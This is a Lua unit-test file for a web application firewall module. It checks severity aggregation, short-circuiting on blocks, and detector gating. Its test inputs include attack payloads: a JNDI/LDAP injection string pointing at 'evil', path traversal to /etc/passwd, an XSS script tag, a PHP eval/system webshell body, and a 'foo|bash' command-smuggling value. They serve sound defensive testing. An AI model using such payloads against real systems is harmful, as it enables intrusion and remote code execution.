-- Tests for cfm_waf _M.check severity-aggregation behaviour (Step 1 of the
-- WAF rework). Verifies that:
--   * a single hit returns the rule's configured action;
--   * highest severity wins when multiple rules fire on the same request;
--   * a block hit short-circuits later detectors;
--   * disabled rules never affect enforcement;
--   * body-only detectors are gated by method+body presence;
--   * the return tuple is the documented (hit, reason, ttl, action, hits).
--
-- Pattern: at the start of each test, disable every rule, then enable only
-- the rules under test via _M.set_rule. This keeps unrelated detectors out
-- of the picture and makes assertions deterministic.

_G.ngx = {
  now            = function() return 1000 end,
  decode_base64  = function(_) return nil end,
  log            = function(_, _) end,
  ERR            = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function disable_all_rules()
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then
      waf.set_rule(k, "disabled")
    end
  end
end

local function fresh_ctx(overrides)
  local ctx = {
    uri     = "/",
    args    = "",
    method  = "GET",
    ip      = "1.2.3.4",
    headers = {},
    body    = "",
  }
  for k, v in pairs(overrides or {}) do ctx[k] = v end
  return ctx
end

-- ── Test 1: single block rule fires and returns block ────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://evil/}",
  }))
  check(hit == true,                     "1: rce block — hit=true")
  check(reason == "WAF_RCE",             "1: rce block — reason WAF_RCE")
  check(action == "block",               "1: rce block — action=block")
  check(type(hits) == "table" and #hits == 1, "1: rce block — hits has 1 entry")
end

-- ── Test 2: single logonly rule returns logonly ──────────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")

  local hit, reason, _ttl, action = waf.check(fresh_ctx({ uri = "/foo/../etc/passwd" }))
  check(hit == true,            "2: traversal logonly — hit=true")
  check(reason == "WAF_TRAVERSAL", "2: traversal logonly — reason")
  check(action == "logonly",    "2: traversal logonly — action=logonly")
end

-- ── Test 3: single challenge rule returns challenge ──────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua", "challenge")

  local hit, reason, _ttl, action = waf.check(fresh_ctx({
    headers = { ["User-Agent"] = "sqlmap/1.5.0" },
  }))
  check(hit == true,                                "3: bad_ua challenge — hit=true")
  check(reason and reason:sub(1, 10) == "WAF_BAD_UA", "3: bad_ua challenge — reason prefix")
  check(action == "challenge",                      "3: bad_ua challenge — action=challenge")
end

-- ── Test 4: logonly first + block later → block (severity wins) ──────────────
-- Traversal (rule 5, logonly) fires first; RCE (rule 6, block) fires next.
-- A first-match WAF would have returned logonly. We return block.
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")
  waf.set_rule("rule_rce",       "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    uri  = "/foo/../",
    args = "x=${jndi:ldap://",
  }))
  check(hit == true,        "4: logonly+block — hit=true")
  check(reason == "WAF_RCE", "4: logonly+block — final reason is WAF_RCE")
  check(action == "block",   "4: logonly+block — final action is block")
  check(#hits == 2,          "4: logonly+block — both hits recorded")
end

-- ── Test 5: challenge first + block later → block (severity wins) ────────────
-- Bad UA (rule 1, challenge) fires; then RCE (rule 6, block) fires.
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua", "challenge")
  waf.set_rule("rule_rce",    "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args    = "x=${jndi:ldap://",
    headers = { ["User-Agent"] = "sqlmap/1.5.0" },
  }))
  check(hit == true,        "5: challenge+block — hit=true")
  check(reason == "WAF_RCE", "5: challenge+block — final reason is WAF_RCE")
  check(action == "block",   "5: challenge+block — final action is block")
  check(#hits == 2,          "5: challenge+block — both hits recorded")
end

-- ── Test 6: block short-circuits later detectors ─────────────────────────────
-- RCE (rule 6) records block and goto-dones. XSS (rule 20) is configured
-- to fire on the same input but must never run.
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")
  waf.set_rule("rule_xss", "challenge")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://&y=<script>alert(1)</script>",
  }))
  check(hit == true,        "6: short-circuit — hit=true")
  check(reason == "WAF_RCE", "6: short-circuit — RCE wins")
  check(action == "block",   "6: short-circuit — action=block")
  check(#hits == 1,          "6: short-circuit — only RCE recorded, XSS skipped")
end

-- ── Test 7: multiple logonly rules → final logonly ───────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")
  waf.set_rule("rule_ip_host",   "logonly")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    uri     = "/foo/../",
    headers = { ["Host"] = "10.0.0.1" },
  }))
  check(hit == true,                                                   "7: 2x logonly — hit=true")
  check(action == "logonly",                                           "7: 2x logonly — final action=logonly")
  check(#hits == 2,                                                    "7: 2x logonly — both hits recorded")
  check(reason == "WAF_TRAVERSAL" or reason == "WAF_IP_HOST",          "7: 2x logonly — reason from one of them")
end

-- ── Test 8: disabled rule does not affect enforcement ────────────────────────
-- Even if RCE input is present, with rule_rce=disabled there should be no hit.
do
  disable_all_rules()
  -- Leave rule_rce disabled; provide a payload that *would* trigger it.

  local hit = waf.check(fresh_ctx({ args = "x=${jndi:ldap://" }))
  check(hit == false, "8: disabled — no hit even with payload present")
end

-- ── Test 9: body-only detector skipped on GET (body_inspect_ok gating) ───────
-- rule_php_webshell_body is body-only and requires method=POST. A clean GET
-- with a webshell body must not fire it.
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  local body = "<?php @eval($_POST['x']); system('id'); ?>"
  local hit = waf.check(fresh_ctx({
    method  = "GET",
    body    = body,
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
  }))
  check(hit == false, "9: GET+body — body detector gated off, no hit")
end

-- ── Test 10: same body fires on POST ─────────────────────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  local body = "<?php @eval($_POST['x']); system('id'); ?>"
  local hit, reason, _ttl, action = waf.check(fresh_ctx({
    method  = "POST",
    body    = body,
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
  }))
  check(hit == true,                                              "10: POST+body — hit=true")
  check(reason and reason:sub(1, 22) == "WAF_PHP_WEBSHELL_BODY:", "10: POST+body — reason prefix")
  check(action == "challenge",                                    "10: POST+body — action=challenge")
end

-- ── Test 11: return tuple shape on no-hit ─────────────────────────────────────
do
  disable_all_rules()

  local hit, reason, ttl, action, hits = waf.check(fresh_ctx({}))
  check(hit == false, "11: no-hit — hit=false")
  check(reason == nil, "11: no-hit — reason is nil")
  check(ttl == nil,    "11: no-hit — ttl is nil")
  check(action == nil, "11: no-hit — action is nil")
  -- hits can be nil OR an empty table; accept either.
  check(hits == nil or (type(hits) == "table" and #hits == 0), "11: no-hit — hits empty/nil")
end

-- ── Test 12: hits[] preserves order and per-entry shape ──────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua",    "challenge")
  waf.set_rule("rule_traversal", "logonly")

  local _hit, _reason, _ttl, _action, hits = waf.check(fresh_ctx({
    uri     = "/foo/../",
    headers = { ["User-Agent"] = "sqlmap/1.5.0" },
  }))
  check(#hits == 2,                          "12: hits — 2 entries")
  -- Bad UA is rule 1; traversal is rule 5. So bad_ua should be hits[1].
  check(hits[1] and hits[1].action == "challenge", "12: hits — first entry is bad_ua challenge")
  check(hits[2] and hits[2].reason == "WAF_TRAVERSAL", "12: hits — second entry is traversal")
  check(hits[1].ttl ~= nil, "12: hits — entry has ttl")
end

-- ── Test 13: get_rule_ids() exposes the registry; rule_id_for(key) lookups ───
do
  local ids = waf.get_rule_ids()
  check(type(ids) == "table",                        "13: get_rule_ids — returns table")
  check(ids.rule_traversal == 101,                   "13: ids — rule_traversal=101")
  check(ids.rule_rce == 320,                         "13: ids — rule_rce=320")
  check(ids.rule_proxy_header_sqli == 321,           "13: ids — rule_proxy_header_sqli=321")
  check(ids.rule_xmlrpc_pingback == 511,             "13: ids — rule_xmlrpc_pingback=511")
  check(ids.rule_cmd_payload_pipe_bash == 315,       "13: ids — rule_cmd_payload_pipe_bash=315")

  -- Caller mutation must not leak into the live table.
  ids.rule_traversal = 999
  local ids2 = waf.get_rule_ids()
  check(ids2.rule_traversal == 101,                  "13: ids — table is a copy, original intact")

  check(waf.rule_id_for("rule_traversal") == 101,    "13: rule_id_for — known key returns ID")
  check(waf.rule_id_for("rule_does_not_exist") == nil, "13: rule_id_for — unknown key returns nil")
  check(waf.rule_id_for(nil) == nil,                 "13: rule_id_for — nil input returns nil")
  check(waf.rule_id_for(42) == nil,                  "13: rule_id_for — non-string returns nil")
end

-- ── Test 14: hit entries carry waf_rule_id; 6th return value is the strongest ─
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")

  local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://evil/}",
  }))
  check(hit == true,                                 "14: rce — hit=true")
  check(waf_rule_id == 320,                          "14: rce — 6th return is rule_rce ID 320")
  check(hits[1] and hits[1].waf_rule_id == 320,      "14: rce — hits[1].waf_rule_id == 320")
end

-- ── Test 15: severity-wins picks the strongest rule's ID, not first-match ────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")  -- ID 101
  waf.set_rule("rule_rce",       "block")     -- ID 320

  local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
    uri  = "/foo/../",
    args = "x=${jndi:ldap://",
  }))
  check(hit == true,                                 "15: combo — hit=true")
  check(waf_rule_id == 320,                          "15: combo — final waf_rule_id is RCE (320), not TRAVERSAL (101)")
  check(#hits == 2,                                  "15: combo — both hits recorded")
  -- Iteration order at call sites: traversal records before RCE.
  check(hits[1].waf_rule_id == 101,                  "15: combo — hits[1] is traversal (101)")
  check(hits[2].waf_rule_id == 320,                  "15: combo — hits[2] is rce (320)")
end

-- ── Test 16: cmd_payload sub-rule IDs map per tag ─────────────────────────────
do
  disable_all_rules()
  -- All cmd_payload variants default to "challenge" except backtick (logonly);
  -- explicit set is defensive in case of CFG drift.
  waf.set_rule("rule_cmd_payload",            "challenge")
  waf.set_rule("rule_cmd_payload_pipe_bash",  "challenge")

  local hit, _reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({
    args = "x=foo|bash",
  }))
  if hit then
    check(waf_rule_id == 315,                        "16: cmd_payload pipe_bash — ID 315")
  end
  -- Tolerant pass: detector might match a different tag depending on
  -- payload tokenisation; we just ensure that *if* it hit, the ID came from
  -- the per-tag override map (any 311-317).
  if hit and waf_rule_id ~= 315 then
    check(waf_rule_id and waf_rule_id >= 311 and waf_rule_id <= 317,
      "16: cmd_payload — fell back to a sibling tag ID in 311-317")
  end
end

if fails > 0 then
  io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
  os.exit(1)
end
print("ok: cfm_waf severity-aggregation tests")
